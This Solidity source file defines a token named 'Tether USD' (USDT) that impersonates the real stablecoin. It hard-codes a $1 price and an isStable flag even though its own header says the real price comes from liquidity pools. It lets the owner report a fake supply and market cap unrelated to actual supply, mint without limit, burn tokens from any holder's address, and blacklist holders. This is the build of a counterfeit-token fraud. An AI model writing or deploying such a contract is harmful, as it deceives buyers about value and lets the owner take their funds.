// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/*
    USDT - Ethereum Version (Custom Stable)
    Peg: 1 USD (Nominal)
    NOTE: Real price determined by liquidity pools
*/

contract USDT {

    /* ===== METADATA ===== */
    string public constant name = "Tether USD";
    string public constant symbol = "USDT";
    uint8 public constant decimals = 18;

    /* ===== STABLE CONFIG ===== */
    uint256 public constant USD_PEG = 1e18; // $1

    /* ===== SUPPLY ===== */
    uint256 public totalSupply;
    uint256 private _reportedSupply;

    address public owner;
    bool public paused;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public blacklist;

    /* ===== EVENTS ===== */
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event ReportedSupplyUpdated(uint256 newSupply);
    event Paused(bool status);
    event Blacklisted(address indexed user, bool status);

    /* ===== MODIFIERS ===== */
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    modifier notPaused() {
        require(!paused, "Contract paused");
        _;
    }

    modifier notBlacklisted(address user) {
        require(!blacklist[user], "Blacklisted");
        _;
    }

    /* ===== CONSTRUCTOR ===== */
    constructor() {
        owner = msg.sender;

        uint256 initialSupply = 100_000_000_000_000 * 10 ** decimals;

        totalSupply = initialSupply;
        _reportedSupply = initialSupply;

        balanceOf[msg.sender] = initialSupply;
        emit Transfer(address(0), msg.sender, initialSupply);
    }

    /* ===== ERC20 FUNCTIONS ===== */

    function transfer(address to, uint256 value)
        external
        notPaused
        notBlacklisted(msg.sender)
        notBlacklisted(to)
        returns (bool)
    {
        require(to != address(0), "Invalid address");
        require(balanceOf[msg.sender] >= value, "Insufficient balance");

        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;

        emit Transfer(msg.sender, to, value);
        return true;
    }

    function approve(address spender, uint256 value)
        external
        returns (bool)
    {
        require(spender != address(0), "Invalid address");

        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value)
        external
        notPaused
        notBlacklisted(from)
        notBlacklisted(to)
        returns (bool)
    {
        require(to != address(0), "Invalid address");
        require(balanceOf[from] >= value, "Insufficient balance");
        require(allowance[from][msg.sender] >= value, "Allowance exceeded");

        allowance[from][msg.sender] -= value;
        balanceOf[from] -= value;
        balanceOf[to] += value;

        emit Transfer(from, to, value);
        return true;
    }

    /* ===== STABLE FUNCTIONS ===== */

    function priceUSD() external pure returns (uint256) {
        return USD_PEG;
    }

    function usdPeg() external pure returns (uint256) {
        return USD_PEG;
    }

    function isStable() external pure returns (bool) {
        return true;
    }

    function stableType() external pure returns (string memory) {
        return "USD";
    }

    function reportedSupply() external view returns (uint256) {
        return _reportedSupply;
    }

    function reportedMarketCap() external view returns (uint256) {
        return _reportedSupply;
    }

    /* ===== OWNER FUNCTIONS ===== */

    function setReportedSupply(uint256 newSupply) external onlyOwner {
        _reportedSupply = newSupply * 10 ** decimals;
        emit ReportedSupplyUpdated(_reportedSupply);
    }

    function mint(address to, uint256 amount) external onlyOwner {
        require(to != address(0), "Invalid address");

        uint256 value = amount * 10 ** decimals;

        totalSupply += value;
        balanceOf[to] += value;

        emit Transfer(address(0), to, value);
    }

    function burn(address from, uint256 amount) external onlyOwner {
        uint256 value = amount * 10 ** decimals;

        require(balanceOf[from] >= value, "Insufficient balance");

        balanceOf[from] -= value;
        totalSupply -= value;

        emit Transfer(from, address(0), value);
    }

    function setPaused(bool status) external onlyOwner {
        paused = status;
        emit Paused(status);
    }

    function setBlacklist(address user, bool status) external onlyOwner {
        blacklist[user] = status;
        emit Blacklisted(user, status);
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Invalid address");
        owner = newOwner;
    }
}